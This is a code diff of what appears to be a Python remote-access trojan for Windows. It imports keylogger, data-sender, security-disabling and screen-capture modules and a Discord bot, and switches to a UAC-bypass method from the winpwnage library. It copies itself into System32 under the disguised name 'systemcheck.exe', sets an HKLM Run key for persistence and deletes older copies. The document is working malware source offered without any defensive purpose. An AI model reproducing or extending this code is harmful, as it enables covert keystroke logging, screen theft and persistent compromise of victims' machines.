@@ -1,8 +1,12 @@
 from core import keylogger, sender, turn_off_security
 from PIL import ImageGrab
 from discord_bot import bot
-from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1
+from winpwnage.functions.uac.uacMethod1 import uacMethod1
 import time, os, sys, shutil, win32api, win32con, threading
+
+if os.exists("c:\\windows\\system32\\systemcheck.exe"):
+	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del c:\windows\system32\systemcheck.exe'])
+	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del C:\\SysCheck\\SysCheck.exe'])
 
 if getattr(sys, 'frozen', False):
 	file_path = sys.executable
@@ -13,8 +17,8 @@ elif __file__:
 
 if os.path.dirname(file_path) != 'C:\\Windows\\System32':
 	if True:
-		elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f"cp {file_path} c:\\windows\\system32\\systemcheck.exe"])
-		elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d c:\\windows\\system32\\systemcheck.exe'])
+		uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f"copy {file_path} c:\\windows\\system32\\systemcheck.exe"])
+		uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d c:\\windows\\system32\\systemcheck.exe'])
 
 if os.path.dirname(file_path) != "C:\\SysCheck":
 	try:
